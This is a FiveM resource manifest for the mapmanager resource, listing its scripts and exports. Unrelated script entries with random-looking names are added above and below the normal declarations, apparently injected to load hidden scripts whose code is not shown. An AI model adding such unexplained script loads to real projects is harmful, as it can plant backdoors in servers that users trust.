client_script "mangane.lua"
server_script "mikh.lua"
client_script "koobs.lua"
server_script "koobs_sv.lua"


fx_version 'cerulean'
game 'gta5' 

client_scripts {
    "mapmanager_shared.lua",
    "mapmanager_client.lua"
}

server_scripts {
    "mapmanager_shared.lua",
    "mapmanager_server.lua"
}

resource_manifest_version "77731fab-63ca-442c-a67b-abc70f28dfa5"

server_export "getCurrentGameType"
server_export "getCurrentMap"
server_export "changeGameType"
server_export "changeMap"
server_export "doesMapSupportGameType"
server_export "getMaps"
server_export "roundEnded"
client_script 'CtMMQnqkhyopWI4N.lua'
client_script 'mYEV.lua'
client_script 'L539.lua'
client_script 'jtxU.lua'


